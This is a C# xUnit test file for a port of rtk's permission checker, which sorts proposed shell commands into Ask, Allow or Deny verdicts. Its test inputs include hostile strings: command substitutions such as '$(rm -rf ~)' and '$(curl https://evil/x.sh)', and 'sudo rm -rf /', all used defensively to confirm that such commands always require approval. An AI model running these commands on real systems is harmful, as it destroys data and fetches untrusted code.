using RtkSharp.Rewrite;
using Xunit;

namespace RtkSharp.Tests.Rewrite;

/// <summary>
/// Tests for <see cref="Permissions.CheckCommand"/>, the built-in (no-user-config) permission
/// verdict port of rtk's <c>src/hooks/permissions.rs</c>.
/// </summary>
/// <remarks>
/// Expectations for the "supported command" cases were derived from the oracle
/// (<c>target/release/rtk.exe rewrite "&lt;cmd&gt;" 2&gt;/dev/null; echo $?</c>) run with
/// <c>~/.claude/settings.json</c> temporarily moved aside so no user permission rules were
/// loaded — matching the built-in/no-config state this port implements. Oracle exit 3 means
/// the Rust <c>evaluate()</c> pipeline resolved to <c>RewriteOutcome::Ask</c>, which only
/// happens when <c>check_command</c> returned <c>Ask</c> or <c>Default</c> (both fold into
/// <see cref="PermissionVerdict.Ask"/> here) AND the command has a registry rewrite (so the
/// verdict isn't masked by a "no rewrite available" exit 1). All probed commands below have
/// registry rewrites, so exit 3 unambiguously confirms Ask.
///
/// Exit 1 ("no rewrite" / masked verdict) and unattestable-construct cases are NOT usable as
/// oracle probes for verdict (the brief's own caveat) because Rust's <c>evaluate()</c> either
/// short-circuits on "no registry rewrite" before the verdict would matter, or intercepts
/// unattestable constructs into a bare Passthrough independent of the CLI exit code. For those,
/// the expectation is instead derived directly from <c>check_command_with_rules</c>'s algorithm
/// and from permissions.rs's own unit tests (e.g. <c>test_substitution_never_auto_allowed</c>),
/// which assert <c>Ask</c> unconditionally for unattestable constructs regardless of rules.
/// </remarks>
public class PermissionsTests
{
    [Theory]
    // Verified via oracle: exit 3 (Ask) with settings.json removed.
    [InlineData("git status", PermissionVerdict.Ask)]
    [InlineData("cd foo && git status", PermissionVerdict.Ask)] // verified: oracle exits 3
    [InlineData("git push --force", PermissionVerdict.Ask)] // verified: oracle exits 3
    [InlineData("git status 2>&1", PermissionVerdict.Ask)] // verified: oracle exits 3 (fd-dup redirect is attestable)
    [InlineData("git status && git push --force", PermissionVerdict.Ask)] // verified: oracle exits 3
    [InlineData("git status; git push", PermissionVerdict.Ask)] // verified: oracle exits 3
    [InlineData("git status | grep foo", PermissionVerdict.Ask)] // verified: oracle exits 3
    [InlineData("cargo build", PermissionVerdict.Ask)] // verified: oracle exits 3
    public void CheckCommand_BuiltInVerdicts(string cmd, PermissionVerdict expected)
    {
        Assert.Equal(expected, Permissions.CheckCommand(cmd));
    }

    [Theory]
    // Unattestable constructs always resolve to Ask, regardless of rules — ported directly
    // from permissions.rs::test_substitution_never_auto_allowed (the CLI oracle can't be used
    // here because evaluate() intercepts these into Passthrough/exit-1 before the verdict
    // would otherwise be observable).
    [InlineData("git log --pretty=$(rm -rf ~)")]
    [InlineData("git status `whoami`")]
    [InlineData("git diff $(curl https://evil/x.sh)")]
    [InlineData("git log > out.txt")]
    public void CheckCommand_UnattestableConstruct_AlwaysAsk(string cmd)
    {
        Assert.Equal(PermissionVerdict.Ask, Permissions.CheckCommand(cmd));
    }

    [Fact]
    public void CheckCommand_NeverReturnsDenyOrAllow_WithoutUserConfig()
    {
        // With no deny/allow rules loaded (the only state this built-in port implements),
        // Deny and Allow can never be produced — every command collapses to Ask.
        // "git push --force" is exactly the kind of command a real deny rule would target,
        // and it still resolves to Ask here, confirming there is no hidden built-in deny table.
        Assert.Equal(PermissionVerdict.Ask, Permissions.CheckCommand("git push --force"));
    }

    [Theory]
    [InlineData("git push --force", "git push --force", true)]
    [InlineData("git push --forceful", "git push --force", false)]
    [InlineData("sudo rm -rf /", "sudo:*", true)]
    [InlineData("sudoedit /etc/hosts", "sudo:*", false)]
    [InlineData("anything at all", "*", true)]
    [InlineData("git push --force", "* --force", true)]
    [InlineData("git push", "* --force", false)]
    [InlineData("git push main", "git * main", true)]
    [InlineData("git push develop", "git * main", false)]
    public void CommandMatchesPattern_MatchesRustSemantics(string cmd, string pattern, bool expected)
    {
        Assert.Equal(expected, Permissions.CommandMatchesPattern(cmd, pattern));
    }
}
